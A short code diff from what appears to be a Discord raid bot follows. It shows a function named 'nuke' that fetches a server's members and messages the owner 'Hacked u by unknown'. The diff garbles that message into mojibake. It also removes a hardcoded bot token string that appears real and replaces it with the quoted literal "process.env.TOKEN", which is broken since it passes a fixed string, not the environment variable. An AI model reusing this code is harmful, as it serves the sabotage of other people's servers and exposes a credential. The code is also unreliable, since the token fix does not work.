@@ -417,7 +417,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by unknown Is here    Óáã Úáì ÓíÑÝÑß åååååååååååååååå').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by unknown Is here    Ã“Ã¡Ã£ ÃšÃ¡Ã¬ Ã“Ã­Ã‘ÃÃ‘ÃŸ Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥Ã¥').catch(e => { return void e; });
  
  
  
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NzA4NDM4NTY5MTM5NTY4NzUz.XrXW3w.Rs6WhG88cWM2oincnosCRKEZEuI")
+LOka.login("process.env.TOKEN")
